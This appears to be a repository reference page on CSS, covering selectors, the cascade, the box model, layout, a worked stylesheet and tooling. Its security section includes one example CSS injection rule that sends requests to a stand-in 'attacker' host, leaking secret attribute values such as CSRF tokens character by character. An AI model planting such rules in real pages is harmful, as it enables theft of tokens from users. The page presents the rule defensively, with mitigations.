# CSS

Cascading Style Sheets is the language that controls the presentation of HTML and other markup documents. It sets color, layout, typography, and responsive behavior. CSS separates how a document looks from what it contains. Though often treated as harmless styling, injected CSS can exfiltrate data and enable interface deception.

## What it is and where it is used

CSS declares rules that match elements and assign them style. The browser combines author styles, user styles, and built-in defaults to compute the final appearance of each element.

CSS appears in external stylesheets linked from HTML, in `<style>` blocks, and in inline `style` attributes. It also drives email templates, printable documents, and the rendering of design systems.

## Syntax and structure

A rule has a selector and a declaration block. Each declaration is a property and a value.

```css
h1 {
  color: navy;
  font-size: 2rem;
}
```

Selectors target elements by type, class, id, attribute, or relationship. Combinators express structural relationships between elements.

```css
.card { padding: 1rem; }
#main { max-width: 60ch; }
input[type="email"] { border-color: gray; }
nav > a { text-decoration: none; }
```

The cascade resolves conflicts when several rules match one element. Specificity ranks selectors: inline styles outrank ids, ids outrank classes and attributes, and those outrank element selectors. When specificity ties, the later rule wins.

The box model describes every element as content, surrounded by padding, then a border, then a margin. The `box-sizing` property decides whether width includes padding and border.

```css
* { box-sizing: border-box; }
.panel {
  padding: 16px;
  border: 1px solid silver;
  margin: 8px;
}
```

Flexbox lays out items along one axis. Grid lays out items in two dimensions, in rows and columns.

```css
.row {
  display: flex;
  gap: 1rem;
  justify-content: space-between;
}
.layout {
  display: grid;
  grid-template-columns: 200px 1fr;
  gap: 1rem;
}
```

Custom properties, often called variables, store reusable values. They are read with `var()` and cascade like other properties.

```css
:root { --accent: #2563eb; }
button { background: var(--accent); }
```

Media queries apply rules conditionally, commonly by viewport width, so a layout can adapt to the device.

```css
@media (max-width: 600px) {
  .layout { grid-template-columns: 1fr; }
}
```

## A worked example

```css
:root {
  --space: 1rem;
  --accent: #2563eb;
  --text: #1f2937;
}

* { box-sizing: border-box; }

body {
  margin: 0;
  color: var(--text);
  font-family: system-ui, sans-serif;
}

.page {
  display: grid;
  grid-template-columns: 220px 1fr;
  gap: var(--space);
  max-width: 1100px;
  margin: 0 auto;
  padding: var(--space);
}

.sidebar {
  display: flex;
  flex-direction: column;
  gap: calc(var(--space) / 2);
}

.sidebar a {
  color: var(--accent);
  text-decoration: none;
}

.card {
  padding: var(--space);
  border: 1px solid #e5e7eb;
  border-radius: 8px;
}

@media (max-width: 700px) {
  .page { grid-template-columns: 1fr; }
}
```

## Tooling

Stylelint checks stylesheets for errors and enforces conventions. Prettier formats CSS consistently. PostCSS transforms CSS through plugins, including Autoprefixer for vendor prefixes.

Preprocessors such as Sass and Less add variables, nesting, and functions that compile to plain CSS. Browser developer tools inspect computed styles, the box model, and specificity conflicts at runtime.

## Security considerations

CSS is not script, but injecting attacker-controlled CSS into a page is a real risk. An injection point that accepts style can read page state and send it elsewhere.

Attribute selectors combined with `url()` enable data exfiltration. A rule such as `input[value^="a"] { background: url(https://attacker/a); }` fires a request that leaks a character of a secret value. Repeated across prefixes, this reconstructs tokens, including CSRF tokens rendered into attributes.

Never place untrusted input into a `style` attribute, a `<style>` block, or a stylesheet path without strict validation. Treat dynamic style the way you treat dynamic markup.

In some legacy contexts, style parsing can lead into script execution, which makes the injection a cross-site scripting issue (CWE-79). Expression-style constructs and certain url handling have historically crossed from style into script.

CSS can also deceive. An attacker who controls style can resize, hide, or overlay elements to trick a user into clicking an unintended control, a technique adjacent to clickjacking. Enforce framing and overlay protections at the application level rather than trusting layout.

Load stylesheets only from origins you control or trust. A compromised third-party stylesheet can restyle a login form into a trap. Use Subresource Integrity on external stylesheets where feasible.

See /SECURE_CODING_REFERENCE.md for input validation and output encoding practice that applies to style context as well as markup.

## Resources

The W3C CSS specifications define the language across modules such as Selectors, Cascade and Inheritance, Box Model, Flexible Box Layout, and Grid Layout. MDN Web Docs documents properties, selectors, and browser support with current behavior.

## Related pages

- /formats/README.md
- /SECURE_CODING_REFERENCE.md
- /formats/html.md
- /formats/markdown.md
- /formats/xml.md
